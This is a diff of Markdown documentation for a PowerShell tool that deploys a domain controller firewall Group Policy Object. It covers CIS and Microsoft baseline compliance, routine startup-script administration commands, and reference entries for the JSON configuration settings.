-#### Center for Internet Security (CIS) Benchmark
+### Center for Internet Security (CIS) Benchmark
 
-[CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks) are created using a consensus review process comprised of a global community of subject matter experts. The process combines real world experience with data-based information to create technology specific guidance to assist users to secure their environments. Consensus participants provide perspective from a diverse set of backgrounds including consulting, software development, audit and compliance, security research, operations, government, and legal.
+![](../Images/Logos/cis-logo.png "CIS Logo"){ width=200pt align=left }
 
-![](../Images/Logos/cis-logo.png){ width=200px }
+[CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks) are created using a consensus review process
+comprised of a global community of subject matter experts.
+The process combines real world experience with data-based information to create technology specific
+guidance to assist users to secure their environments. Consensus participants provide perspective
+from a diverse set of backgrounds including consulting, software development, audit and compliance,
+security research, operations, government, and legal.
 
-Our firewall configuration is compliant with the majority of the [CIS Microsoft Windows Server 2022 v2.0.0 L1 DC](https://www.tenable.com/audits/CIS_Microsoft_Windows_Server_2022_Benchmark_v2.0.0_L1_DC) requirements out-of-the-box. The configuration file can easily be modified to achieve full compliance, with one negligible exception.
+Our firewall configuration is compliant with the majority
+of the [CIS Microsoft Windows Server 2022 v2.0.0 L1 DC](https://www.tenable.com/audits/CIS_Microsoft_Windows_Server_2022_Benchmark_v2.0.0_L1_DC)
+requirements out-of-the-box. The configuration file can easily be modified
+to achieve full compliance, with one negligible exception.
 
 | CIS Title | Compliance |
 |------------------------------------|-----------|
@@ -965,13 +2890,17 @@ Our firewall configuration is compliant with the majority of the [CIS Microsoft 
 
 [^cis-partially]: All the profiles share the same log file. See the [LogFilePath](#logfilepath) setting.
 
-#### Microsoft Security Compliance Toolkit
+### Microsoft Security Compliance Toolkit
 
-The [Security Compliance Toolkit (SCT)](https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/security-compliance-toolkit-10) is a set of tools that allows enterprise security administrators to download, analyze, test, edit, and store Microsoft-recommended security configuration baselines for Windows and other Microsoft products.
+![](../Images/Logos/microsoft-logo.png "Microsoft Logo"){ width=200pt align=left }
 
-![](../Images/Logos/microsoft-logo.png){ width=200px }
+The [Security Compliance Toolkit (SCT)](https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/security-compliance-toolkit-10)
+is a set of tools that allows enterprise security administrators to download, analyze, test, edit,
+and store Microsoft-recommended security configuration baselines for Windows and other Microsoft products.
 
-Our firewall configuration is compliant with the majority of the [SCT Windows Server 2022 Security Baseline](https://www.microsoft.com/en-us/download/details.aspx?id=55319) requirements out-of-the-box. The configuration file can easily be modified to achieve full compliance.
+Our firewall configuration is compliant with the majority
+of the [SCT Windows Server 2022 Security Baseline](https://www.microsoft.com/en-us/download/details.aspx?id=55319)
+requirements out-of-the-box and the configuration file can easily be modified to achieve full compliance.
 
 | Firewall Policy Path | Setting Name | Win 2016 DC Requirement | Win 2022 DC Requirement | Compliance |
 |-------------------|----------------|-----------|-----------|---------------------|
@@ -999,1173 +2928,16 @@ Our firewall configuration is compliant with the majority of the [SCT Windows Se
 | Public Profile\\State | Inbound connections | Block | Block | ☑ |
 | Public Profile\\State | Outbound connections | Allow | Allow | ☑ |
 
-## Group Policy Object Contents
-
-![Managed GPO contents](../Images/Screenshots/gpo-contents.png)
-
-### Firewall Configuration
-
-Based on the configured options in `Set-ADDSFirewallPolicy.json` [configuration file](#configuration-file), the GPO will contain Windows Firewall profile settings:  
-
-- [Log dropped packets](#logdroppedpackets)
-- [Log allowed packets](#logallowedpackets)
-- [Log file location](#logfilepath)
-- [Maximum log size](#logmaxsizekilobytes)
-- [Enable local IPSec rule merge](#enablelocalipsecrules)
-
-![GPO firewall configuration](../Images/Screenshots/gpo-firewall-config.png)
-
-### Inbound Firewall Rules
-
-Based on the configured options in `Set-ADDSFirewallPolicy.json` [configuration file](#configuration-file), the GPO will contain set of inbound [firewall rules](#inbound-firewall-rules-reference).
-
-![GPO inbound firewall rules](../Images/Screenshots/gpo-firewall-inbound-rules.png)
-
-### Registry Settings
-
-Based on the configured options in `Set-ADDSFirewallPolicy.json` [configuration file](#configuration-file), the GPO will contain number of registry settings.  
-Most of them are managed, which means, once the GPO is not linked to the target, the settings revert back to the default state.  
-Some of them are [unmanaged](#dealing-with-gpo-tattooing) though and need different approach, when you require reverting back to default.
-
-![GPO registry settings](../Images/Screenshots/gpo-registry.png)
-
-### Administrative Templates
-
-The following ADMX and their respective ADML (in English) are copied to Central Store if it exists:
-
-`DomainControllerFirewall.admx`
-
-- Contains template for configuration of the following settings:
-  - [NTDS Static Port](#ntdsstaticport)  
-  Computer Configuration → Administrative Templates → RPC Static Ports → Domain Controller: Active Directory RPC static port
-  - [Netlogon Static Port](#netlogonstaticport)  
-  Computer Configuration → Administrative Templates → RPC Static Ports → Domain Controller: Netlogon static port
-  - [FRS Static Port](#frsstaticport)  
-  Computer Configuration → Administrative Templates → RPC Static Ports → Domain Controller: File Replication Service (FRS) static port
-  - [mDNS Configuration](#disablemdns)  
-Computer Configuration → Administrative Templates → Network → DNS Client → Turn off Multicast DNS (mDNS) client
-
-`MSS-legacy.admx`
-
-- Contains template for configuration of all the settings stored in:  
-Computer Configuration → Administrative Templates → MSS (Legacy)
-
-`SecGuide.admx`
-
-- Contains template for configuration of all the settings stored in:  
-Computer Configuration → Administrative Templates → MS Security Guide
-
-### Startup Script
-
-Startup script is used to configure some of the required settings, that are not easily configurable through Group Policy.  
-`FirewallConfiguration.bat` script, is automatically generated, based on the configuration defined in the `Set-ADDSFirewallPolicy.json` file.
-If enabled in the .json file, the script will execute the following actions:
-
-- Configure WMI static port
-- Installs DFS Management tools, if not already present on the machine
-- Configure DFSR static port
-- Creates firewall log and sets the permissions on it
-- Registers RPC filters, defined in `RpcNamedPipesFilters.txt`
-
-> [!WARNING]
-> Due to the [GPO foreground processing](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/jj573586(v=ws.11)) requirement, when applying a startup script, the server needs to be restarted to apply the configuration items in the script.
-
-#### WMI static port
-
-The script will move the WMI service to a standalone process listening on TCP port 24158 with authentication level set to RPC_C_AUTHN_LEVEL_PKT_PRIVACY.
-
-```bat
-winmgmt.exe /standalonehost 6
-```
-
-#### DFSR static port
-
-If the server doesn't have DFS Management tools installed, the script will istall it.
-
-```bat
-if not exist "%SystemRoot%\system32\dfsrdiag.exe" (
-  dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt
-)
-```
-
-Next, it will configure the DFSR to use static port.
-
-```bat
-dfsrdiag.exe StaticRPC /Port:5722
-```
-
-#### Firewall Log File
-
-![Firewall log file configuration](../Images/Screenshots/firewall-log-config.png){ width=400px }
-
-Log file is not created by the GPO, ACLs need to be configured through command line.
-
-```bat
-netsh.exe advfirewall set allprofiles logging filename "%systemroot%\system32\logfiles\firewall\pfirewall.log"
-```
-
-#### RPC Filters Script
-
-![RPC Filters configuration file](../Images/Screenshots/deploy-rpcnamedpipesfilter.png)  
-
-The script will register all RPC filters defined in `RpcNamedPipesFilters.txt` file, which is located in the same path as the `FirewallConfiguration.bat`, in the "Startup" folder under the recently created firewall GPO.
-
-```bat
-netsh.exe -f "\\contoso.com\SysVol\contoso.com\Policies\{37CB7204-5767-4AA7-8E85-D29FEBDFF6D6}\Machine\Scripts\Startup\RpcNamedPipesFilters.txt"
-```
-
-### NPS Fix for Downlevel Windows Servers
-
-Windows Server 2016 and 2019
-
-[EnableNPS](#enablenps)
-
-```bat
-sc.exe sidtype IAS unrestricted
-```
-
-#### Sample Startup Script
-
-```shell
-@ECHO OFF
-REM This script is managed by the Set-ADDSFirewallPolicy.ps1 PowerShell script.
-
-echo Move the WMI service to a standalone process listening on TCP port 24158 with authentication level set to RPC_C_AUTHN_LEVEL_PKT_PRIVACY.
-winmgmt.exe /standalonehost 6
-
-echo Install the dfsrdiag.exe tool if absent.
-if not exist "%SystemRoot%\system32\dfsrdiag.exe" (
-    dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt
-)
-
-echo Set static RPC port for DFS Replication.
-dfsrdiag.exe StaticRPC /Port:5722
-
-echo Create the firewall log file and configure its DACL.
-netsh.exe advfirewall set allprofiles logging filename "%systemroot%\system32\logfiles\firewall\pfirewall.log"
-
-echo Register the RPC filters.
-netsh.exe -f "%~dp0RpcNamedPipesFilters.txt"
-
-echo Fix the NPS service to work with Windows Firewall on downlevel Windows Server versions.
-sc.exe sidtype IAS unrestricted
-```
-
-## Configuration
-
-### Configuration File
-
-All settings that are used for the deployment by the script need to be stored in the file named `Set-ADDSFirewallPolicy.json`.  
-The file does not exist by default and needs to be created by you, before deployment.  
-To help you with the task, we're providing the 2 following files:  
-
-- `Set-ADDSFirewallPolicy.Starter.json`
-- `Set-ADDSFirewallPolicy.Sample.json`  
-
-`Set-ADDSFirewallPolicy.Starter.json` file contains only the minimum settings required for deployment. It is recommended to rename the file to `Set-ADDSFirewallPolicy.json` and add any additional settings you want to be configured during the deployment.
-
-`Set-ADDSFirewallPolicy.Sample.json` contains all possible configuration items, with sample values.
-It is essential to properly configure all the settings, do not use the samples for production deployment without thorough review and adjustment.
-
-> [!CAUTION]
-> Improper configuration can cause network outages in your environment!
-
-```json
-{
-  "$schema": "Set-ADDSFirewallPolicy.schema.json",
-  "GroupPolicyObjectName": "Domain Controller Firewall",
-  "TargetDomain": "contoso.com",
-  "GroupPolicyObjectComment": "This GPO is managed by the Set-ADDSFirewallPolicy.ps1 PowerShell script.",
-  "LogDroppedPackets": true,
-  "LogAllowedPackets": false,
-  "LogFilePath": "%systemroot%\\system32\\logfiles\\firewall\\pfirewall.log",
-  "LogMaxSizeKilobytes": 128,
-  "ClientAddresses": [ "10.220.2.0/24", "10.220.4.0/24", "10.220.5.0/24", "10.220.6.0/24" ],
-  "ManagementAddresses": [ "10.220.3.0/24" ],
-  "DomainControllerAddresses": [ "10.220.1.0/24" ],
-  "NtdsStaticPort": 38901,
-  "NetlogonStaticPort": 38902,
-  "FrsStaticPort": 38903,
-  "DfsrStaticPort": 5722,
-  "WmiStaticPort": true,
-  "DisableNetbiosBroadcasts": true,
-  "DisableLLMNR": true,
-  "DisableMDNS": true,
-  "BlockManagementFromDomainControllers": false,
-  "EnableServiceManagement": true,
-  "EnableEventLogManagement": true,
-  "EnableScheduledTaskManagement": true,
-  "EnableWindowsRemoteManagement": true,
-  "EnablePerformanceLogAccess": true,
-  "EnableOpenSSHServer": false,
-  "EnableRemoteDesktop": true,
-  "EnableDiskManagement": true,
-  "EnableBackupManagement": true,
-  "EnableFirewallManagement": false,
-  "EnableComPlusManagement": false,
-  "EnableLegacyFileReplication": false,
-  "EnableNetbiosNameService": false,
-  "EnableNetbiosDatagramService": false,
-  "EnableNetbiosSessionService": false,
-  "EnableWINS": false,
-  "EnableDhcpServer": false,
-  "EnableNPS": false,
-  "EnableKMS": false,
-  "EnableWSUS": false,
-  "EnableWDS": false,
-  "EnableWebServer": false,
-  "EnablePrintSpooler": false,
-  "EnableFSRMManagement": false,
-  "EnableNetworkProtection": true,
-  "BlockWmiCommandExecution": true,
-  "EnableRpcFilters": true,
-  "EnableLocalIPsecRules": false,
-  "CustomRuleFileNames": [
-      "CustomRules.BackupAgent.ps1",
-      "CustomRules.ManagementAgent.ps1"
-   ]
-}
-```
-
-TODO: Intellisense support:
-
-![Visual Studio Code support](../Images/Screenshots/settings-intellisense.png)
-
-The rest of this chapter contains documentation to all the available settings.
-
-### GroupPolicyObjectName
-
-The name of the Group Policy Object (GPO) that will be created or updated. Feel free to change it so that it complies with your naming policy.
-
-```yaml
-Type: String
-Required: true
-Default value: "Domain Controller Firewall"
-```
-
-### GroupPolicyObjectComment
-
-The comment text that will be visible on the GPO object.
-
-```yaml
-Type: String
-Required: false
-Default value: "This GPO is managed by the Set-ADDSFirewallPolicy.ps1 PowerShell script."
-```
-
-### TargetDomain
-
-FQDN of the domain in which the Group Policy Object (GPO) will be created or updated. This setting is only useful in multi-domain forests. If not specified, the script will attempt to determine the domain of the current user.
-
-```yaml
-Type: String
-Required: false
-Default value: null
-```
-
-### LogDroppedPackets
-
-Indicates whether the packets dropped by the firewall should be logged.
-
-If `true`, all dropped packets will be logged into the [firewall text log](#logfilepath). If `false`, no packets are logged.  
-
-```yaml
-Type: Boolean
-Required: false
-Default value: false
-Recommended value: true
-Possible values: true / false
-```
-
-### LogAllowedPackets
-
-Indicates whether the packets allowed by the firewall should be logged.
-
-If `true`, all allowed packets will be logged into the [firewall text log](#logfilepath). If `false`, no packets are logged.  
-
-```yaml
-Type: Boolean
-Required: false
-Default value: false
-Recommended value: false
-Possible values: true / false
-```
-
-### LogFilePath
-
-Specifies the path to the log file that will be used to store information about the allowed and/or dropped packets, if [logging is enabled](#logdroppedpackets).  
-As all 3 profiles (Domain/Private/Public) are configured identically, single log file is created for all of them, to allow easier search, troubleshooting and ingestion by log collectors.  
-
-[Startup script](#startup-script)
-
-```shell
-echo Create the firewall log file and configure its DACL.
-netsh.exe advfirewall set allprofiles logging filename "%systemroot%\system32\logfiles\firewall\pfirewall.log"
-```
-
-```yaml
-Type: String
-Required: false
-Default value: %systemroot%\\system32\\logfiles\\firewall\\pfirewall.log
-```
-
-### LogMaxSizeKilobytes
-
-Sets the maximum size of the [firewall log](#logfilepath) in kilobytes (KB). The file won't grow beyond this size; when the limit is reached, old log entries are deleted to make room for the newly created ones.
-
-```yaml
-Type: Integer
-Required: false
-Default value: 128
-Recommended value: 32767
-Possible values: 1 - 32767
-```
-
-### ClientAddresses
-
-List of client IP adresses from which inbound traffic should be allowed.
-
-Possible values: IPv4 address, IPv4 subnet or IPv4 address range, separated by a comma, e.g. "10.220.2.0/24", "10.220.4.0/24", "10.220.5.0/24", "192.168.0.1-192.168.0.10". Supports also "Any" as an input.
-
-Specify IPv4 address, IPv4 subnet or address range of all your clients. Anything what acts as a client from a DC perspective is considered client here, so you should specify all your server and user/client subnets.  
-Everything that needs to interact with your DCs should be included here, except other DCs and secure endpoints (PAWs) used to manage Domain Controllers or Tier 0.
-
-> [!WARNING]
-> This is a critical configuration setting! With improper configuration, this could cause network outage for your clients.
-
-```yaml
-Type: String[]
-Required: false
-Default value: [ "Any" ]
-```
-
-### ManagementAddresses
-
-List of IP addresses from which inbound management traffic should be allowed.
-
-Possible values: IPv4 address, IPv4 subnet or IPv4 address range, separated by a comma, e.g. "10.220.2.0/24", "10.220.4.0/24", "10.220.5.0/24", "192.168.0.1-192.168.0.10".
-
-Specify IPv4 address, IPv4 subnet or address range of all secure endpoints (PAWs) used to manage Domain Controllers or Tier 0.  
-
-> [!WARNING]
-> This is a critical configuration setting! With improper configuration, this could cause network outage for your management workstations.
-
-```yaml
-Type: String[]
-Required: false
-Default value: [ "Any" ]
-```
-
-### DomainControllerAddresses
-
-List of domain controller IP addresses, between which replication and management traffic will be allowed.
-
-Possible values: IPv4 address, IPv4 subnet or IPv4 address range, separated by a comma, e.g. "10.220.2.0/24", "10.220.4.0/24", "10.220.5.0/24", "192.168.0.1-192.168.0.10".
-
-Specify IPv4 address, IPv4 subnet or address range of all your Domain Controllers in the forest.
-
-> [!WARNING]
-> This is a critical configuration setting! With improper configuration, this could cause network outage for your DCs.
-
-```yaml
-Type: String[]
-Required: false
-Default value: [ "Any" ]
-```
-
-### NtdsStaticPort
-
-Static port to be used for inbound Active Directory RPC traffic.
-
-By default, the RPC is using dynamic ports 49152 – 65535. If `null`, this setting is not managed through GPO. If value is defined, this value will be set as static port for Active Directory RPC traffic. See the [How to restrict Active Directory RPC traffic to a specific port](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/restrict-ad-rpc-traffic-to-specific-port) article for more information.
-If set to 0 (zero), the port is set to dynamic.
-If this is configured, you also need to configure the `NetlogonStaticPort` value.
-
-> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters  
-> Registry value: TCP/IP Port  
-> Value type: REG_DWORD  
-> Value data: (available port)
-
-Restart the computer for the new setting to become effective.
-
-```yaml
-Type: Integer
-Default value: null
-Recommended value: 38901
-Possible values: null / 0 / 1024 - 49151
-```
-
-### NetlogonStaticPort
-
-Description: By default, the RPC is using dynamic ports 49152 – 65535. If `null`, this setting is not managed through GPO. If value is defined, this value will be set as static port for Active Directory RPC traffic. See the [How to restrict Active Directory RPC traffic to a specific port](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/restrict-ad-rpc-traffic-to-specific-port) article for more information.
-If set to 0 (zero), the port is set to dynamic.
-If this is configured, you also need to configure `NtdsStaticPort` value.
-
-> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters  
-> Registry value: DCTcpipPort  
-> Value type: REG_DWORD  
-> Value data: (available port)
-
-Restart the Netlogon service for the new setting to become effective.
-
-```yaml
-Type: Integer
-Default value: null
-Recommended value: 38902
-Possible values: null / 0 / 1024 - 49151
-```
-
-### FrsStaticPort
-
-Static port to be used for legacy FRS traffic.
-
-By default, the FSR is using dynamic RPC ports. If `null`, this setting is not managed through GPO. If value is defined, this value will be set as static port for DFS Replication traffic.
-If set to 0 (zero), the port is set to dynamic.
-
-> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTFRS\\Parameters  
-> Registry value: RPC TCP/IP Port Assignment  
-> Value type: REG_DWORD  
-> Value data: (available port)
-
-Restart the File Replication service for the new setting to become effective.
-
-```yaml
-Type: Integer
-Default value: null
-Recommended value: 38903
-Possible values: null / 0 / 1024 - 49151
-```
-
-### DfsrStaticPort
-
-Static port to be used for DFSR traffic.
-
-By default, the DFSR is using dynamic ports 49152 – 65535. If `null`, this setting is not managed through GPO. If value is defined, this value will be set as static port for DFS Replication traffic, for more info, see the [Configuring DFSR to a Static Port - The rest of the story](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/configuring-dfsr-to-a-static-port-the-rest-of-the-story/ba-p/396746) article.
-If set to 0 (zero), the port is set to dynamic.
-
-[Startup script](#startup-script)
-
-1024 - 49151:
-
-```shell
-echo Install the dfsrdiag.exe tool if absent.
-if not exist "%SystemRoot%\system32\dfsrdiag.exe" (
-    dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt
-)
-
-echo Set static RPC port for DFS Replication.
-dfsrdiag.exe StaticRPC /Port:5722
-```
-
-0:
-
-```shell
-echo Install the dfsrdiag.exe tool if absent.
-if not exist "%SystemRoot%\system32\dfsrdiag.exe" (
-    dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt
-)
-
-echo Set dynamic RPC port for DFS Replication.
-dfsrdiag.exe StaticRPC /Port:0
-```
-
-`null`: not present
-
-```yaml
-Type: Integer
-Default value: null
-Recommended value: 5722
-Possible values: null / 0 / 1024 - 49151
-```
-
-### WmiStaticPort
-
-Indicates whether inbound Windows Management Instrumentation (WMI) traffic should use a static port.
-
-By default, the WMI is using dynamic ports 49152 – 65535. If `null`, this setting is not managed through GPO. If `true`, WMI will use static port 24158, if false, WMI will use dynamic port. For more info, see the [Setting Up a Fixed Port for WMI](https://learn.microsoft.com/en-us/windows/win32/wmisdk/setting-up-a-fixed-port-for-wmi) article.
-
-[Startup script](#startup-script)
-
-`true`:
-
-The [RPC_C_AUTHN_LEVEL_PKT_PRIVACY](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/425a7c53-c33a-4868-8e5b-2a850d40dc73) setting prevents replay attacks, verifies that none of the data transferred between the client and server has been modified and ensures that the data transferred can only be seen unencrypted by the client and the server.
-
-```shell
-echo Move the WMI service to a standalone process listening on TCP port 24158 with authentication level set to RPC_C_AUTHN_LEVEL_PKT_PRIVACY.
-winmgmt.exe /standalonehost 6
-```
-
-`false`:
-
-```shell
-echo Move the WMI service into the shared Svchost process.
-winmgmt.exe /sharedhost
-```
-
-`null`: not present
-
-```yaml
-Type: Boolean
-Required: false
-Default value: null
-Recommended value: true
-Possible values: true / false / null
-```
-
-### DisableNetbiosBroadcasts
-
-Indicates whether the NetBIOS protocol should be switched to P-node (point-to-point) mode. If `true` NetBIOS node type is set to P-node. If `false` NetBIOS node type is set to H-node (hybrid) If `null` NetBIOS node type is not managed through GPO.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: null
-Recommended value: true
-Possible values: true / false / null
-```
-
-### DisableLLMNR
-
-Indicates whether the Link-Local Multicast Name Resolution (LLMNR) client should be disabled.
-
-If `true`, Link Local Multicast Name Resolution (LLMNR) is disabled. If `false`, LLMNR is enabled. If `null` LLMNR configuration is not managed through GPO. For more info, please refer to the *AZ-WIN-00145* configuration item in the [Windows security baseline](https://learn.microsoft.com/en-us/azure/governance/policy/samples/guest-configuration-baseline-windows).
-
-```yaml
-Type: Boolean
-Required: false
-Default value: false
-Recommended value: true
-Possible values: true / false
-```
-
-### DisableMDNS
-
-Indicates whether the Multicast DNS (mDNS) client should be disabled.
-
-If `true`, mDNS is disabled. If `false`, mDNS is enabled. If `null`, this setting is not managed through GPO. For more info, see the following [Microsoft article](https://techcommunity.microsoft.com/t5/networking-blog/mdns-in-the-enterprise/ba-p/3275777).
-
-```yaml
-Type: Boolean
-Required: false
-Default value: null
-Recommended value: true
-Possible values: true / false / null
-```
-
-### BlockManagementFromDomainControllers
-
-Indicates whether management traffic from other domain controllers should be blocked. This setting affects the following firewall rules:
-
-> [!NOTE]
-> TODO: Provide a list of affected FW rules
-
-If `true`... if `false`...
-
-```yaml
-Type: Boolean
-Required: false
-Default value: false
-Recommended value: true
-Possible values: true / false
-```
-
-### EnableServiceManagement
-
-Indicates whether remote service management should be enabled.
-
-If `true`, corresponding ports are open and remote services management will be available. If `false`, services cannot be managed remotely. The script achieves this by enabling or disabling the [Remote Service Management (RPC)](#remote-service-management-rpc) firewall rule.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableEventLogManagement
-
-Indicates whether remote event log management should be enabled. If `true`, the corresponding port is open and remote Event Log management will be available. If `false`, Event Log cannot be managed remotely.  The script achieves this by enabling or disabling the [Remote Event Log Management (RPC)](#remote-event-log-management-rpc) firewall rule.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: true
-Possible values: true / false
-```
-
-### EnableScheduledTaskManagement
-
-Indicates whether remote scheduled task management should be enabled.
-
-If `true`, corresponding ports are open and remote scheduled tasks management will be available. If `false`, scheduled tasks cannot be managed remotely. The script achieves this by enabling or disabling the [Remote Scheduled Tasks Management (RPC)](#remote-scheduled-tasks-management-rpc) firewall rule.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableWindowsRemoteManagement
-
-Indicates whether inbound Windows Remote Management (WinRM) traffic should be enabled. This protocol is used by PowerShell Remoting, Server Manager, and [PowerShell CIM cmdlets](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/?view=powershell-7.4).
-
-If `true`, corresponding ports are open and WinRM will be available. If `false`, WinRM ports won’t be open. The script achieves this by enabling or disabling the [Windows Remote Management (HTTP-In)](#windows-remote-management-http-in) and [Windows Remote Management (HTTPS-In)](#windows-remote-management-https-in) firewall rules.
-
-For more info, see the following [Microsoft article](https://learn.microsoft.com/en-us/windows/win32/winrm/about-windows-remote-management).
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: true
-Possible values: true / false
-```
-
-### EnablePerformanceLogAccess
-
-Indicates whether remote performance log access should be enabled.
-
-If `true`, corresponding ports are open and remote Performance Log management will be available. If `false`, Performance Log cannot be managed remotely. The script achieves this by enabling or disabling the [Performance Logs and Alerts (TCP-In)](#performance-logs-and-alerts-tcp-in) firewall rule.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableOpenSSHServer
-
-Indicates whether inbound OpenSSH traffic should be enabled.
-
-If `true`, corresponding ports are open and OpenSSH will be available. If `false`, OpenSSH won't be allowed. The script achieves this by enabling or disabling the [OpenSSH SSH Server (sshd)](#openssh-ssh-server-sshd) firewall rule.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableRemoteDesktop
-
-Indicates whether inbound Remote Desktop Protocol (RDP) traffic should be enabled.
-
-If `true`, corresponding ports are open and remote desktop connection (RDP) will be available. If `false`, RDP is not available. The script achieves this by enabling or disabling the [Remote Desktop - User Mode (TCP-In)](#remote-desktop---user-mode-tcp-in) and [Remote Desktop - User Mode (UDP-In)](#remote-desktop---user-mode-udp-in) firewall rules.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: true
-Possible values: true / false
-```
-
-### EnableDiskManagement
-
-Indicates whether remote disk management should be enabled.
-
-If `true`, corresponding ports are open and remote disk management will be available. If `false`, disks cannot be managed remotely. The script achieves this by enabling or disabling the [Remote Volume Management - Virtual Disk Service Loader (RPC)](#remote-volume-management---virtual-disk-service-loader-rpc) and [Remote Volume Management - Virtual Disk Service (RPC)](#remote-volume-management---virtual-disk-service-rpc) firewall rules.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableBackupManagement
-
-Indicates whether remote management of Windows Server Backup should be enabled.
-
-If `true`, corresponding ports are open and remote Windows Backup management will be available. If `false`, Windows Backup cannot be managed remotely. The script achieves this by enabling or disabling the [Windows Backup (RPC)](#windows-backup-rpc) firewall rule.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableFirewallManagement
-
-Indicates whether remote firewall management should be enabled.
-
-If `true`, corresponding ports are open and remote Windows Defender Firewall management will be available. If `false`, Windows Defender Firewall cannot be managed remotely. The script achieves this by enabling or disabling the [Windows Defender Firewall Remote Management (RPC)](#windows-defender-firewall-remote-management-rpc) firewall rule.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableComPlusManagement
-
-Indicates whether inbound COM+ management traffic should be enabled.
-
-If `true`, corresponding ports are open and remote DCOM traffic for COM+ System Application management is allowed. If `false`, COM+ System Application cannot be managed remotely. The script achieves this by enabling or disabling the [COM+ Remote Administration (DCOM-In)](#com-remote-administration-dcom-in) firewall rule.
-
-For more info, see the following [Microsoft article](https://learn.microsoft.com/en-us/windows/win32/cossdk/com--application-overview).
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableLegacyFileReplication
-
-Indicates whether inbound legacy file replication traffic should be enabled.
-
-If `true`, corresponding ports are open for NTFRS replication. If you still haven’t migrated your `SYSVOL` replication to modern DFSR, you need to enable this setting. If `false`, NTFRS ports won’t be open. The script achieves this by enabling or disabling the [File Replication (RPC)](#file-replication-rpc) firewall rule.
-
-For more info, see the following [Microsoft article](https://learn.microsoft.com/en-us/windows-server/storage/dfs-replication/migrate-sysvol-to-dfsr).
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableNetbiosNameService
-
-Indicates whether inbound NetBIOS Name Service should be allowed.
-
-If `true`, corresponding ports (UDP 137) are open and NetBIOS will be available. If `false`, NetBIOS ports are not open. The script achieves this by enabling or disabling the [File and Printer Sharing (NB-Name-In)](#file-and-printer-sharing-nb-name-in) firewall rule.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableNetbiosDatagramService
-
-Indicates whether inbound NetBIOS Datagram Service traffic should be allowed.
-
-If `true`, corresponding ports (UDP 138) are open and NetBIOS will be available. If `false`, NetBIOS ports are not open. The script achieves this by enabling or disabling the [Active Directory Domain Controller - NetBIOS name resolution (UDP-In)](#active-directory-domain-controller---netbios-name-resolution-udp-in) firewall rule.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableNetbiosSessionService
-
-Indicates whether inbound NetBIOS Session Service (NBSS) traffic should be allowed.
-
-If `true`, corresponding ports (TCP 139) are open and NetBIOS will be available. If `false`, NetBIOS ports are not open. The script achieves this by enabling or disabling the [File and Printer Sharing (NB-Session-In)](#file-and-printer-sharing-nb-session-in) firewall rule.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableWINS
-
-Indicates whether inbound Windows Internet Name Service (WINS) traffic should be allowed.
-
-If `true`, corresponding ports are open and Windows Internet Naming Service (WINS) will be available. If `false`, WINS ports are not open. The script achieves this by enabling or disabling the [Windows Internet Naming Service (WINS) (TCP-In)](#windows-internet-naming-service-wins-tcp-in), [Windows Internet Naming Service (WINS) (UDP-In)](#windows-internet-naming-service-wins-udp-in), and [Windows Internet Naming Service (WINS) - Remote Management (RPC)](#windows-internet-naming-service-wins---remote-management-rpc) firewall rules.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableDhcpServer
-
-Indicates whether inbound Dynamic Host Configuration Protocol (DHCP) server traffic should be allowed.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableNPS
-
-Indicates whether inbound Network Policy Server (NPS) / RADIUS traffic should be allowed.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### RadiusClientAddresses
-
-```yaml
-Type: String[]
-Required: false
-Default value: [ "Any" ]
-```
-
-### EnableKMS
-
-Indicates whether inbound Key Management Service (KMS) traffic should be allowed.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableWSUS
-
